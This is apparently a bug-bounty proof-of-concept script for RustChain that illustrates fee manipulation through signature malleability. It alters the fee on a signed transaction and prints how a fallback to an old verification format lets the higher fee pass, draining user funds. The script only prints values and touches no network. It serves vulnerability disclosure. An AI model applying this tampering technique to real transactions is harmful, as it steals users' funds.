#!/usr/bin/env python3
"""
RustChain Fee Manipulation via Signature Malleability
漏洞: #2867 (Security Audit)
奖励: 50 RTC (High)

攻击: 修改 fee 字段
结果: 用户资金被盗
"""

import json

def exploit():
    # 用户签名 (低 fee)
    signed_tx = {
        "from": "user_addr",
        "to": "recipient",
        "amount": 10.0,
        "fee": 0.0001,
        "memo": "",
        "nonce": 12345,
    }
    
    # 攻击者修改 (高 fee)
    malicious_tx = signed_tx.copy()
    malicious_tx["fee"] = 1.0  # 增加 10000 倍
    
    print("🎯 攻击前 (用户签名):")
    print(f"  Fee: {signed_tx['fee']} RTC")
    print()
    print("🎯 攻击后 (攻击者修改):")
    print(f"  Fee: {malicious_tx['fee']} RTC")
    print()
    print("📊 影响:")
    print("  - 新格式验证失败 (fee 不匹配)")
    print("  - 回退到旧格式 (fee 被忽略)")
    print("  - 旧格式验证通过")
    print("  - 实际扣费: 1.0 RTC (用户只同意 0.0001)")
    print("  - 资金损失: 0.9999 RTC")

if __name__ == "__main__":
    exploit()